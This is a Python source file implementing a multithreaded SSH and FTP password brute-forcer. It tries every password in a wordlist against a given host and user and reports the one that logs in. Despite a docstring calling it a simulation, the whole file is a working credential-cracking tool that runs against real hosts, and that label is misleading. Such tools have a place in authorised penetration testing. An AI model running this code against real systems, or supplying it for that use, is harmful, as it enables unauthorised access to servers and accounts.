import paramiko
import ftplib
import socket
import time
from concurrent.futures import ThreadPoolExecutor

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

class NetworkCracker:
    """Simulates network-based brute-force attacks for SSH and FTP."""
    
    def ssh_brute_force(self, hostname, username, wordlist, port=22, threads=4):
        """Attempts to crack SSH credentials."""
        results = {"success": False, "password": None, "attempts": 0}
        
        def _try_ssh(password):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname, port=port, username=username, password=password, timeout=5)
                return password
            except paramiko.AuthenticationException:
                return None # Normal auth failure
            except socket.timeout:
                return "TIMEOUT"
            except socket.error as e:
                return f"CONN_ERROR: {str(e)}"
            except Exception as e:
                return f"ERROR: {str(e)}"
            finally:
                client.close()

        print(f"[*] Starting SSH Brute-force on {hostname} for user '{username}'...")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(0, len(wordlist), threads):
                chunk = wordlist[i:i+threads]
                futures = [executor.submit(_try_ssh, pwd) for pwd in chunk]
                
                for future in futures:
                    results["attempts"] += 1
                    res = future.result()
                    if res == None: continue
                    if "ERROR" in str(res) or "TIMEOUT" in str(res):
                        print(f"{Colors.RED}[!] Issue: {res}{Colors.END}")
                        continue
                    if res:
                        results["success"] = True
                        results["password"] = res
                        return results
        return results

    def ftp_brute_force(self, hostname, username, wordlist, port=21, threads=4):
        """Attempts to crack FTP credentials."""
        results = {"success": False, "password": None, "attempts": 0}

        def _try_ftp(password):
            ftp = ftplib.FTP()
            try:
                ftp.connect(hostname, port, timeout=3)
                ftp.login(user=username, passwd=password)
                ftp.quit()
                return password
            except ftplib.error_perm:
                return None
            except Exception:
                return "ERROR"
            finally:
                try: ftp.close()
                except: pass

        print(f"[*] Starting FTP Brute-force on {hostname} for user '{username}'...")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(0, len(wordlist), threads):
                chunk = wordlist[i:i+threads]
                futures = [executor.submit(_try_ftp, pwd) for pwd in chunk]

                for future in futures:
                    results["attempts"] += 1
                    res = future.result()
                    if res == "ERROR": continue
                    if res:
                        results["success"] = True
                        results["password"] = res
                        return results
        return results

if __name__ == "__main__":
    # Test (Simulated)
    cracker = NetworkCracker()
    # test_res = cracker.ssh_brute_force("127.0.0.1", "root", ["123", "password"])
    # print(test_res)
